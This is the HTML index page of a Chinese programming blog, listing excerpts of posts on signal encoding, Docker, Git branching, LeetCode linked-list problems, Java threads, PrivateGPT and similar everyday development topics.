<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8060928fbc098e5d8b0a2a2749d76b00/" rel="bookmark">
			时钟，NRZ/PAM4信号，眼图的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
一、时钟频率，信号速率，信号的Nyquist频率
二、时钟生成NRZ/PAM4信号 三、NRZ/PAM4信号眼图的生成
一、时钟频率，信号速率，信号的Nyquist频率 频率，指的是周期信号的在一秒内重复的次数，即，单位是Hz。
信号速率，指的是一个信号在一秒内传输的比特数，单位是bit/s（也可写成bps，读做比特率）。关于速率的一些衍生单位，如果我们将信号进行编码，假设将两个比特视作一个symbol，那么一个波特就等于两个比特，单位就可以表征为Buad/s（即Bps，读作波特率）。也就是说比特率是波特率的倍数，比特率=编码位数*波特率。
信号的Nyquist频率，对于一串随机发送出来的信号，该信号是可以分解成很多个不同频率分量不同幅度相位的正弦信号叠加来的。Nyquist频率指的就是该信号的最高频率，可以理解为该信号一个比特传输所需要的时间分之一。下面会说明。 二、时钟生成NRZ/PAM4信号 如上图所示，CLK假设为26.5625GHz的时钟，我们在时钟的上下沿均生成一个0或者1数据。我们看T1和T2两个周期内的NRZ/PAM4 信号。NRZ是一个比特编码，所以NRZ信号只有两种symbol，即0和1。PAM4是两个比特一个编码，因此有四种可能的symbol，即00、01、10、11。转化到信号的幅度上，NRZ信号只有两种电平状态，PAM4有四种电平状态。下面来生成信号。
NRZ：上图中的NZR在CLK跳变沿只需要生成一个比特就能完成一个symbol的编码，四个跳变沿随机生成了0110的四个symbol，当然随机生成的信号是什么序列都要可能。如过这个序列生成的是规律的0101，那么这个信号就是时钟，他的频率也就是26.5625GHz，我们也无法根据这个时钟生成频率更高的序列了，那么这就是他的最高频率，就是这个NRZ信号的Nyquist频率。随机信号不是周期的没有频率一说，我们都说信号的最高（Nyquist）频率。再来看NRZ的信号速率，这个NRZ信号一个时钟周期内生成了两个比特，那么它的信号速率局势时钟频率*2，即data rate=时钟频率*2=53.125Gbps=53.125GBps（因为NRZ一个比特就是一个symbol所以一比特等于一波特）。
PAM4：上图中的PAM4在CLK跳变沿需要生成两个比特就才完成一个symbol的编码，四个跳变沿随机生成了3(11)2(10)1(01)0(00)的四个symbol。这个序列需要两个时钟周期，如歌以这个序列重复，那么这个生成的周期信号频率只有时钟周期的一边，但是如果以第一个周期生成的3(11)2(10)一直重复，那么这个PAM4信号的频率也是时钟周期的频率。那么可以得出这个时钟产生的PAM4信号，其Nyquist频率也为26.5625GHz。在来看一个时钟周期产生了多少个比特多少个symbol。从图中得出T1周期内，PAM4信号产生了四个比特两个symbol。因此，这个PAM信号的速率是时钟频率*4比特=106.25Gbps或者说是时钟频率*2symbol=53.125GBps。
NRZ和PAM4的原理就是如此，根据具体产生方式做不同分析。
三、NRZ/PAM4信号眼图的生成 现在，我们将每个周期的NRZ都切开，然后叠加在一个周期内。那么得到的波形是下图所示。左图是完全没有干扰的信号，因此所有周期的结果都是完美重叠的变成一个工字。但是实际信号传输的过程中会存在噪声，插损，时钟等诸多因素影响，导致并不是都是完全重叠的。于是就得到了一个右边的眼图。因为NRZ信号只有两个电平，因此只需要一个时钟周期就能覆盖所以情况。在眼图里面，横轴是时间，单位是UI(等于生成这个信号的时钟周期），纵轴是信号幅度，单位是电压。 同理，PAM4有四种电平，三个眼睛，从（二）的图中看得出，如果需要覆盖三个眼睛至少需要1.5个UI。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37a1c822fc50d0cfb404b789e8305601/" rel="bookmark">
			Docker知识点整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker和虚拟机技术的区别： 传统的虚拟机，可以虚拟出一条硬件，运行一个完整的操作系统，在这个操作系统上安装和运行所需的软件
容器内的应用可以直接运行在宿主 主机的内核中，容器没有自己的内核，也不用虚拟硬件 （轻便）
每个容器是相互隔离的，每个容器内都有属于自己的文件系统，之间互不影响。
docker为什么比VM（虚拟机）快？ Docker有着比虚拟机更少的抽象层。docker利用的是宿主机的内核，vm需要是Guest OS。新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。
虚拟机是加载GuestOS，分钟级别的，而docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！ Docker优点 1. 应用于更快速的交付和部署
传统：通过大量的帮助文档，安装程序！
Docker：打包镜像发布测试，一键运行！
2. 更便捷的升级和扩缩容
通过使用Docker，部署应用 如同搭积木一样！
3. 更简单的系统运维
使用容器化之后，开发和测试环境是高度一致的
4.更高效的计算资源利用
Docker是内核级别的虚拟化，可以在一个物理机上运行很多的容器，让服务器的性能可以压榨到极致
Docker组成介绍 镜像（Image）：
docker镜像就好比一个模板，我们可以通过这个模板来创建容器服务，tomcat镜像===&gt;run==&gt;tomcat01容器（提供服务器），通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的）。
容器（container）：
docker利用容器技术，独立运行一个或者一组应用 通过镜像来创建
启动，停止，删除，基本命令！
目前就可以把这个容器理解为就是一个简易的linux系统
仓库（repository）：
仓库就是存放 镜像（image）的地方！
仓库又可以分为 公有仓库和私有仓库
Docker命令 镜像相关 docker images REPOSITORY 镜像的仓库源
TAG 镜像的标签
IMAGE ID 镜像的id
CREATED 镜像的创建时间
SIZE 镜像的大小
# 命令参数可选项
-a, --all # 显示所有镜像 (docker images -a)
-q, --quiet # 仅显示镜像id (docker images -q)
docker search（搜索镜像） 命令参数可选项 (通过搜索来过滤)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37a1c822fc50d0cfb404b789e8305601/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/637694eee18301cf7d68448fb152a6bb/" rel="bookmark">
			[PTA]计算字符串长度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 从键盘任意输入一个字符串，计算其实际字符个数并输出。不使用字符串处理函数strlen，编程用自定义函数MyStrlen实现strlen的功能。
函数接口: unsigned int MyStrlen(char str[]);
输入格式: 输入一个字符串，以回车结束。
输出格式: 输出字符串长度。
部分主函数样例 输入样例: 在这里给出一组输入。例如：
输出样例: 在这里给出相应的输出。例如：
/*注：这道题就是实现string.h这个头文件中strlen函数的功能， 根据指针的类型就可以明白strlen为什么只能对字符数组长度计 算*/ #include &lt;stdio.h&gt; unsigned int MyStrlen(char str[]); int main() { char a[80]; unsigned int len; gets(a); /*在此补充缺失语句*/ len = MyStrlen(a); printf("%u\n", len); return 0; } /*在此实现MyStrlen函数*/ unsigned int MyStrlen(char str[])//接收指针 { int i = 0;//初始化为零，计数 while (*(str+i)!='\0')//str+i就是a数组下标为i的元素的地址 /*一定要循环至结束符结束运算，每个数组的末尾其实都有结束符，因此 需要用结束符作为结束标志，但不会将结束符计入长度中*/ { i++; } return i;//返回计数的结果 } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/828fc75812cf4819fd03e27746734083/" rel="bookmark">
			12.14打卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.用上一次实验安装的Redhat在安装zhcon中文镜像包的时候会发现提示没有网络，经过百度原来是我在安装linux的时候网络的选项没有打勾，网络显示的是关闭的，重新安装红帽子记得把以太网的选项打开就可以了。
2.在写echo语句的时候，注意echo后面要加空格才能进行正确的显示，不然的话echo会显示出来然后显示命令找不到。
3.安装zhcon流程：
（1）https://rpm.pbone.net/info_idpl_72830878_distro_fedora31_com_zhcon-0.2.6-37.fc31.x86_64.rpm.html 去这个网站选择合适的rpm进行下载，在linux控制台使用wget下载
（2）修改yum源
（3）yum安装gpm yum install gpm
（4）安装zhcon软件包
（5）输入zhcon --utf8进入中文界面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d0e12b69709031c66cde398eb518c4a/" rel="bookmark">
			Python3开发笔记（简洁版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、开发编辑器 1. pycharm 2. IDLE（Python自带软件） 方法：Microsoft Store搜索 Python 安装
二、数据类型 Python中有以下几种主要的数据类型：
数字（Numbers）、
字符串（Strings）、
布尔值（Boolean）、
空值（None）、
列表（Lists）、
元组（Tuples）、
字典（Dictionaries）、
集合（Sets）。 1. 数字（Numbers） 在Python中，number数据类型可以分为以下几种：整数、浮点数、复数。 # 整数 num1 = 42 #【注：python定义变量的方式很简单，通过变量名 = 数据，即可定义一个变量】 num2 = 0b0110 #【注：在Python中，二进制整数使用前缀0b表示】 # 浮点数 num3 = 3.14159 # 复数 num4 = 3+4j 整数、浮点数可以直接进行四则运算：
# 加法 num1 = 10 num2 = 0.5 result = num1 + num2 print(result) # ==&gt; 10.5 # 减法 result = num1 - num2 print(result) # ==&gt; 9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d0e12b69709031c66cde398eb518c4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afb40b101495fa83fd592b907c8f1c88/" rel="bookmark">
			大模型应用_PrivateGPT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://github.com/imartinez/privateGPT
1 功能 整体功能，想解决什么问题
搭建完整的 RAG 系统，与 FastGPT相比，界面比较简单。但是底层支持比较丰富，可用于知识库的完全本地部署，包含大模型和向量库。适用于保密级别比较高，或者完全不想使用收费模型和服务的情况。当前解决了什么问题，哪些问题解决不了
PrivateGPT 提供了整体转换、入库、存储、匹配、合成答案，图形界面的解决方案，并提供图形界面用于检索操作。
RAG 所面对的问题，比如不够准确，多文档组合生成答案这些问题，需要进一步细化工具，似乎不能通过架构来解决。另外，由于多数本地部署的模型效果与 ChatGPT 差距比较大，这里只是看到了本地部署的架构和实现的可能性，部署后用户是否能接受其效果，还待验证。提供哪些功能点，其中哪些是刚需
核心功能是通过简单的操作，实现对本地文件的检索和问答，功能相对单一。用户使用难度，操作逻辑是否过于复杂
整体工具链使用了poetry构建，安装相对方便。但由于包含了深度学习库，肯定比一般项目复杂很多，安装时间长，占空间大。
Dockerfile如果写得有一点问题（频繁更新，难免有错），就会面临至少部分内容重新下载打包的问题。另外，由于可插拔的选项比较多，还需要用户进一步设置。 2 技术栈 技术栈是什么： PrivateGPT 不是一个用大量代码实现具体功能的项目，相反，它尽量使用现有工具，主要提供架构，组织现有方法，以实现功能。 现有底层工具消化了哪些常用功能 llamaindex 文档的转换和管理pytorch &amp; cuda 本地支持深度学习模型，因此image也较大sentence-transformers 文本匹配FastAPI 后端框架Chroma 向量数据库Qdrant 向量数据库Gradio 界面由Gradio实现，有效降低了程序的复杂度fern 管理文档使用 poetry 管理项目 代码分析（使用cloc工具统计） 代码 3.2M，主要为 Python 代码，共 2733 行local 版本 image 大小为 6.34G，external 版本为 5.68G核心代码在：private_gpt/private_gpt/ 目录下 使用场景 完全本地化的知识库 3 商业模式 相对简单的项目，代码主要在架构和调用其它工具，依赖 llama-index，并实现了扩展，如支持几个主流向量数库，后面可能接入更多模型和向量库。可作为一种集成的方案，或者支持各种组件插拔的 Hub 使用。
4 使用 4.1 安装 下载项目 $ git clone https://github.com/imartinez/privateGPT $ cd privateGPT 修改配置文件 vi settings.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afb40b101495fa83fd592b907c8f1c88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc5dd8ae47a9da496f7239b2c4924e42/" rel="bookmark">
			LVGL——色环部件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、部件组成
二、部件操作
1、创建
2、设置
3、获取
三、项目案例
一、部件组成 主体(LV_PART_MAIN）
旋钮(LV_PART_KNOB)
二、部件操作 1、创建 lv_obj_t *cw = lv_colorwheel_create( parent, knob_recolor ); 2、设置 lv_colorwheel_set_rgb(cw, lv_color_hex(0xff0000)); lv_colorwheel_set_mode(cw, LV_COLORWHEEL_MODE_HUE/SATURATION/VALUE);	/* 色相、饱和度、明度 */ lv_colorwheel_set_mode_fixed(cw, true);	/* 固定色环模式 */ 3、获取 lv_colorwheel_get_rgb(cw); 三、项目案例 #include "mygui.h" #include "lvgl.h" #include &lt;stdio.h&gt; #include &lt;stdbool.h&gt; /* 获取当前活动屏幕的宽高 */ #define scr_act_width() lv_obj_get_width(lv_scr_act()) #define scr_act_height() lv_obj_get_height(lv_scr_act()) lv_obj_t* obj; static void colorwheel_event_cb(lv_event_t *e) { lv_obj_t *target = lv_event_get_target(e); /* 获取触发源 */ lv_obj_set_style_bg_color(obj, lv_colorwheel_get_rgb(target), LV_PART_MAIN); /* 设置基础对象背景颜色 */ } void lv_colorwheel() { /* 色环（用于选择颜色） */ lv_obj_t *colorwheel = lv_colorwheel_create(lv_scr_act(), true); /* 创建色环 */ lv_obj_set_size(colorwheel, scr_act_height() * 2 / 3, scr_act_height()* 2 / 3); /* 设置大小 */ lv_obj_center(colorwheel); /* 设置位置 */ lv_obj_set_style_arc_width(colorwheel, scr_act_height() * 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc5dd8ae47a9da496f7239b2c4924e42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3a8406f3456e7dbf8b089df4e11dc51/" rel="bookmark">
			JavaEE：多线程(1)：线程是啥？怎么创建和操作？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		进程的问题 本质上来说，进程可以解决并发编程的问题
但是有些情况下进程表现不尽如人意
1. 如果请求很多，需要频繁的创建和销毁进程的时候，此时使用多进程编程，系统开销就会很大
2. 一个进程刚刚启动的时候，需要把依赖的代码和数据从磁盘加载到内存中
但是从系统分配一个内存不是件容易事情
申请内存的时候需要指定大小，系统内部把各种大小的空闲内存，通过一定的数据结构组织起来
实际申请的时候要去这样的空间中查找，找到大小合适的空间，再进行分配
所以引入一个概念，线程
线程 线程称为轻量级进程，保持进程的独立调度执行，同时省去了分配资源和释放资源带来的额外开销
使用PCB描述一个线程 多个线程的PCB的内存指针指向同一个内存空间
这意味着只用创建第一个线程的时候需要从系统分配资源，后续的线程就不必分配，直接共用前面的那份资源就可以了
除了内存之外，文件描述符表(硬盘资源)也是多个线程共用一份的
把能够进行资源共享的线程分成组，称为线程组
一个进程可以有1个PCB，也可以有多个PCB（意味着这个进程包含了一个线程组，也就是包含多个线程）
上面图中这多个线程合起来就是一个进程
进程和线程的关系 有线程之前，进程要扮演两个角色：资源分配的基本单位；调度执行的基本单位
有线程之后，进程专注于资源分配，线程专注于调度执行
例子：一个滑稽吃100只鸡，消耗的时间比较多
第一个方案：搞两个房间，每个滑稽吃50只，速度大幅度增加
这个相当于多进程，创建新的进程就要申请更多的资源（房间和桌子）
第二个方案，房间和桌子数量不变，但是滑稽数量增加到两个
这种就是多线程，资源开销更小 更多的滑稽，每个滑稽分到的鸡就更少了，但是速度更快了
但是线程分配越多越好吗？
当引入的线程达到一定数量之后，再继续引入线程就没办法提升了，因为线程之间会竞争CPU资源，但是CPU资源是有限的，非但提高不了效率，还会增加调度的开销
而且多个线程之间会打架，可能导致代码中出现逻辑错误
这种就是线程安全问题
另外，多线程共享资源也有副作用，1号和2号滑稽抢鸡腿，1号抢到了，2号勃然大怒：都别吃了！直接把整个桌子给破坏了
也就是说，一个线程如果抛出异常而且没有处理好的话，可能会导致整个进程被终止
总结一下 1. 进程包含线程
2. 每个线程是一个独立的执行流，可以执行代码并参与CPU调度中（每个线程都有状态，优先级，记账信息和上下文）
3. 每个线程都有自己的资源，进程中的线程共享一份资源
4. 进程和线程之间，不会相互影响。但是如果同一个进程中某个线程抛出异常，可能导致进程中其他线程异常终止
5. 同一个进程中的线程之间会互相干扰，引起线程安全问题
6. 线程太多会导致调度开销过多的问题
多线程编程 Java推荐多线程编程，系统提供了多线程编程的API
Java里一般把跑起来的程序称为进程，没有运行起来的程序(exe)，称为可执行文件
一个进程里的第一个线程称为主线程，main方法就是主线程的入口
创建线程 这里的run类似于main方法，是一个Java进程的入口方法；不需要程序员手动调用，会在合适的时机（线程创建好了之后），被JVM自动调用执行
这种风格的函数被称为回调函数
(回调函数是一种特殊的函数，它作为参数传递给另一个函数，并在被调用函数执行完毕后被调用)
为什么要override呢？
重写的本质是扩展现有的类，Thread标准库里面的run是不知道你的需求是什么，必须要手动指定
//1. 创建一个自己的类来继承Thread（在java.lang里面，自动导包） class MyClass extends Thread{ @Override public void run(){ System.out.println("hello world"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3a8406f3456e7dbf8b089df4e11dc51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b8f99c239c9951fc172b56dac1a156f/" rel="bookmark">
			博客摘录「 socket连接过程中，异常断开（服务关闭和网线断开）的处理」2023年12月14日
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/u014436243/article/details/106471313网络环境会发生波动导致网络异常，这时候就需要设备有一个断线重连机制
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e0494c31e59b725cd03b6c5bf8531b3/" rel="bookmark">
			超级弱口令检查工具下载链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://github.com/shack2/SNETCracker/releases
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce17a63a53ae2ce162370798a1306950/" rel="bookmark">
			C&#43;&#43;力扣题目19--删除链表的倒数第N个结点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 给你一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。
示例 1：
输入：head = [1,2,3,4,5], n = 2 输出：[1,2,3,5] 思路：双指针的经典应用，如果要删除倒数第n个节点，让fast移动n步，然后让fast和slow同时移动，直到fast指向链表末尾。删掉slow所指向的节点就可以了。下面有图
class Solution { public: ListNode* removeNthFromEnd(ListNode* head, int n) { ListNode* virhead = new ListNode(); virhead-&gt;next = head; ListNode* fast = virhead; ListNode* slow = virhead; while (n &gt;= 0&amp;&amp;fast)//让fast先走n+1步，之后再和slow一起走， { //等fast走到最后结点，slow和它相差n+1， // slow正好到了要删除的结点的前驱结点处 fast = fast-&gt;next; n--; } while (fast) { fast = fast-&gt;next; slow = slow-&gt;next; } ListNode* p = slow-&gt;next;//删除结点 slow-&gt;next = slow-&gt;next-&gt;next; delete p; return virhead-&gt;next; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ea64a6e812d2f628042e3abf5b0a194/" rel="bookmark">
			CMA、CNAS软件检测公司分享：压力测试应关注的指标和面临的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件压力测试是容易被传统企业忽视的测试点，用户人数一旦超过预期，极易造成软件产品卡顿、崩溃的情况，不利于用户正常使用，严重影响企业公信力和盈利水平。今天卓码软件测评小编来聊聊压力测试过程中应该关注的指标和会面临的问题。
一、软件压力测试应关注的指标
1. TPS
TPS是英文Transaction per Second的缩写，是指在一秒钟之内系统可以处理的事务数量，一个事务指软件发出请求，服务器响应的过程，TPS的数据越大，说明系统的处理能力越强，但是TPS会受到代码、服务器性能等因素的制约。
2. QPS
QPS 即英文Queries Per Second的缩写，是指被测试的软件在一秒钟之内能够处理查询的次数，也就是软件最大的吞吐能力，它强调的是服务器的处理能力。
3. 并发用户数(并发量)
并发用户数(并发量)是指每秒对待测试接口发起请求的用户数量。
4. CPU
CPU是英文Central Processing Unit的缩写，是计算机的中央处理器，负责解释计算机指令和处理计算机中的数据。
二、软件压力测试过程可能会面临的问题
1、一些开发人员可能会低估软件系统所需的负载能力，导致系统在正式上线后无法应对大量用户和数据量的情况。
2、由于软件系统复杂性的增加以及硬件条件的限制，系统中可能存在一些性能瓶颈，如响应时间过长、吞吐量不足等问题。
3、由于测试环境和实际使用环境存在差异，可能会出现一些与真实环境不一致的问题。
三、CMA、CNAS软件检测公司分享
卓码软件测评，获得权威的CMA、CNAS双重资质认证，多年来专注于软件测评服务，价格优惠，服务周到，各类测试类型覆盖全国各地，出具的软件检测报告具备法律效力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d7cce8e62b087b1fab23798f2be6cf1/" rel="bookmark">
			Git版本管控及发布(master/hotfix/develop/feature/release)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		master(主分支) 存在一条主分支（master）。所有用户可见的正式版本，都从master发布。主分支作为稳定的唯一代码库，不做任何开发使用。
拉取源合并目标修改生命期无需无需不允许持续 develop(开发分支) 存在一条开发分支（develop）。这个分支维护了当前开发中代码的主线，始终保持代码新于master。持续集成、最新隔夜版本的生成等都是基于这个分支。由于当前版本迭代较快，开发分支只提供拉取，不进行实际开发。
拉取源合并目标修改生命期master无需不允许持续 feature(功能分支) 临时性多个功能分支（feature）。从develop拉取。开发feature完成，merge回develop。为了降低对其他feature的影响，一般在提测前merge回develop分支。
拉取源合并目标修改生命期developdevelop允许合并后删除 功能分支的名字，可以采用feature-* 的形式命名。
创建一个功能分支：
git chechout -b feature-x develop 开发完成后，将功能分支合并到develop分支：
git checkout develop git merge --no-ff feature-x 删除feature分支：
git branch -d feature-x release(预发布分支) 临时性多个预发布（测试）分支（release），用于QA测试。从develop拉取，测试完成merge回master和develop。如果测试期间，有其他版本合并入master，需要同步到release版本，并进行测试。
拉取源合并目标修改生命期developmaster &amp; develop允许合并后删除 创建一个预发布分支：
git checkout -b release-1.2 develop 确认没有问题后，合并master分支：
git checkout master git merge --no-ff release-1.2 对合并生成的新节点，做一个标签
git tag -a 1.2 再合并到develop分支：
git checkout deveop git merge --no-ff release-1.2 最后，删除预发布分支：
git branch -d release-1.2 hotfix(修补bug分支) 临时性多个bug修复分支（fixbug），用于修复线上问题。从master拉取，修复并测试完成merge回master和develop。如果修复期间，有其他版本合并入master ，需要同步到fixbug版本，并进行测试。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d7cce8e62b087b1fab23798f2be6cf1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/410e020d6e8c03dd64271e63d0c51ee7/" rel="bookmark">
			Android 升级签名算法从SHA1withRSA 升级到SHA256withRSA
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 背景 想到要修改这个问题 是因为收到下面整改通知 要求我们更新签名文件的签名算法，看到这个问题都懵了呀 虽然打包天天用签名文件 但是从来没关注过他呀
开发者自查： 不要使用已经过时或不安全的弱算法，确保签名证书使用了更强的签名算法， 如 SHA-2（其中包括 SHA-256 和 SHA-512）。
然后就想着查看下签名信息：
首先 查看签名信息有三种方法，
第一种使用JDK的keytool -printcert -jarfile apk
第二种 使用Android sdk build-tool 下的 apksigner 的apksigner verify -v --print-cert apk
第三种 使用jarsigner 暂时不考虑这种。
先用keytool -printcert -jarfile apk查看，还真是
再用apksigner 的apksigner verify -v --print-cert apk查看自己的apk
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true
Verified using v3 scheme (APK Signature Scheme v3): false
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/410e020d6e8c03dd64271e63d0c51ee7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c41235d748a0391ebc95845477c962d4/" rel="bookmark">
			C&#43;&#43;力扣题目24--两两交换链表中的节点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。
示例 1：
输入：head = [1,2,3,4] 输出：[2,1,4,3] 思路：正常模拟过程即可，按照下图中的三步来进行设计。代码如下：
class Solution { public: ListNode* swapPairs(ListNode* head) { ListNode* virhead = new ListNode();//建立一个虚拟头结点 virhead-&gt;next = head; ListNode* cur = virhead; while (cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next) { ListNode* temp1 = cur-&gt;next; ListNode* temp2= cur-&gt;next-&gt;next-&gt;next; cur-&gt;next = cur-&gt;next-&gt;next;//将虚拟头结点指向头结点的后继结点 cur-&gt;next-&gt;next = temp1;//注意：此时cur-&gt;next已经是头结点的后继结点了，将该后继结点指向其前驱结点 cur-&gt;next-&gt;next-&gt;next= temp2;//将该轮的最后结点指向下一轮要处理的第一个结点 cur = cur-&gt;next-&gt;next;//cur移动两个结点，继续下一次交换 } return virhead-&gt;next; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/657e939e6e72f2adaa10d11d276f9427/" rel="bookmark">
			LLM（六）| Gemini：谷歌Gemini Pro 开放API ，Gemini Pro 可免费使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		近期，Google Gemini Pro 开放API 了，且Gemini Pro 可免费使用！Gemini Pro支持全球180个国家的38种语言，目前接受文本作为输入并生成文本作为输出。
Gemini API 地址：http://ai.google.dev
Gemini Pro 的表现超越了其他同类模型，当前版本配备了 32K 文本上下文窗口，可免费使用，且其定价将十分有竞争力。
具备丰富的功能：函数调用、数据嵌入、语义检索、自定义知识嵌入以及聊天功能。可处理文本输入并生成文本输出，以及专门的 Gemini Pro 视觉多模态终端，能够处理图像和文本输入，输出文本。
提供多种 SDK，以便开发者在不同平台上构建应用，包括 Python、Android (Kotlin)、Node.js、Swift 和 JavaScript。
Gemini Pro 提供了易于使用的 SDK，助力开发者在任何平台上快速构建应用。还提供了一个免费的在线开发工具 Google AI Studio，快速构建 Gemini 应用。
Studio ：https://makersuite.google.com
Gemini Pro Python API使用 下面将介绍如何使用Python SDK使用Gemini API，具体内容如下：
设置开发环境和申请Gemini API访问权限；
根据文本输入生成文本响应；
从多模式输入（文本和图像）生成文本响应；
使用Gemini进行多轮对话（聊天）；
使用Gemini进行embedding。
1）设置开发环境和申请Gemini API访问权限 安装相关库
!pip install -q -U google-generativeai 导入相关包
import pathlibimport textwrap​import google.generativeai as genai​# Used to securely store your API keyfrom google.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/657e939e6e72f2adaa10d11d276f9427/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba33788d8b1ed98b30d455004d3bba83/" rel="bookmark">
			60.ORA-12528: TNS:listener
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Oracle创建DG备库时，备库无法连接。
ERROR:
ORA-12528: TNS:listener: all appropriate instances are blocking new connections
2.解决方法 newdg2 =
(DESCRIPTION =
(ADDRESS = (PROTOCOL = TCP)(HOST = 10.1.1.1)(PORT = 1600))
(CONNECT_DATA =
(SERVER = DEDICATED)
(SERVICE_NAME = xxx)
(UR=A)
)
)
连接串中加UR=A
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fe1b8ca9f6403ccfdd889487a11c69a/" rel="bookmark">
			C&#43;&#43;学习-2023/12/14-C&#43;&#43;类中成员函数的函数指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
